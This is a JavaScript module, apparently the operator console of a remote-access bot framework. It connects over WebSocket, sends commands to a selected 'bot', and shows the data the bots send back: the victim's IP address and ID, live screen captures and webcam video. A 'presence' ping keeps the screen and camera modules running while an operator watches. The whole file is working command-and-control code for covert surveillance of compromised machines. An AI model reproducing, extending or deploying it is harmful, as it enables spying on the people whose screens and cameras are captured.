// frontend/client_control/js/modules/websocket/connection.js

/* ==========================================================================
   1. ИМПОРТЫ И УТИЛИТЫ (Imports & UI Helpers)
========================================================================== */

import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null;
let botWatchdog = null;
let presenceInterval = null; // Интервал для пинга присутствия оператора
const decoder = new TextDecoder();

const updateUI = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val || '...';
};

const setOnline = (isOnline) => {
    const indicator = document.getElementById('status-indicator');
    if (indicator) indicator.classList.toggle('online', isOnline);
    updateUI('status-text', isOnline ? 'online' : 'offline');
};

/* ==========================================================================
   2. ОБРАБОТКА ВХОДЯЩИХ ПАКЕТОВ (Data Handling)
========================================================================== */

function handleIncomingData(buffer) {
    const pkg = decodePacket(buffer);
    if (!pkg || pkg.id !== AppState.clientId) return;

    setOnline(true);
    clearTimeout(botWatchdog);
    botWatchdog = setTimeout(() => setOnline(false), 10000);

    switch (pkg.module) {
        case 'DataScribe':
        case 'Heartbeat':
            try {
                const data = JSON.parse(decoder.decode(pkg.payload));
                if (data.ip) updateUI('display-ip', data.ip);
                if (data.id) updateUI('display-id', data.id);
            } catch (e) { console.warn("[WS] Metadata Error"); }
            break;

        case 'ScreenWatch':
            if (pkg.payload.byteLength > 200) renderScreenRGBA(pkg.payload);
            break;

        case 'Webcam':
            if (window.renderWebcam) window.renderWebcam(pkg.payload);
            break;

        default:
            window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
    }
}

/* ==========================================================================
   3. УПРАВЛЕНИЕ СОЕДИНЕНИЕМ (Connection Management)
========================================================================== */

export function initControlConnection() {
    const { token, login } = {
        token: localStorage.getItem('auth_token'),
        login: localStorage.getItem('user_login')
    };

    if (!token || !login || !AppState.clientId) return;

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    socket = new WebSocket(`${prot}//${location.host}/ws?token=${token}&login=${login}&mode=control`);
    socket.binaryType = 'arraybuffer';

    socket.onopen = () => {
        console.log("🚀 [WS] Connected to Control");

        // 1. Разовый запрос метаданных при входе
        window.sendToBot("DataScribe", "get_metadata");

        // 2. ПИНГ ПРИСУТСТВИЯ (Dead Man's Switch)
        // Каждые 5 секунд говорим боту, что мы всё еще здесь.
        // Бот на своей стороне должен ждать этот пакет. Если его нет > 7-10 сек,
        // бот останавливает ScreenWatch, CamGaze и прочие тяжелые модули.
        presenceInterval = setInterval(() => {
            if (socket?.readyState === 1) {
                // Шлем пакет именно этому боту в модуль Heartbeat с командой presence
                socket.send(encodePacket(AppState.clientId, "Heartbeat", "presence"));
            }
        }, 5000);

        // 3. Keep-Alive для сервера (чтобы прокси не рвал соединение)
        setInterval(() => {
            if (socket?.readyState === 1) socket.send(encodePacket("", "Heartbeat", "ping"));
        }, 5000);
    };

    socket.onmessage = (e) => e.data instanceof ArrayBuffer && handleIncomingData(e.data);

    socket.onclose = () => {
        console.log("❌ [WS] Connection closed");
        setOnline(false);
        clearTimeout(botWatchdog);
        clearInterval(presenceInterval); // Обязательно останавливаем пинг
    };

    window.sendToBot = (mod, pay) => {
        if (socket?.readyState === 1) {
            socket.send(encodePacket(AppState.clientId, mod, pay));
        }
    };
}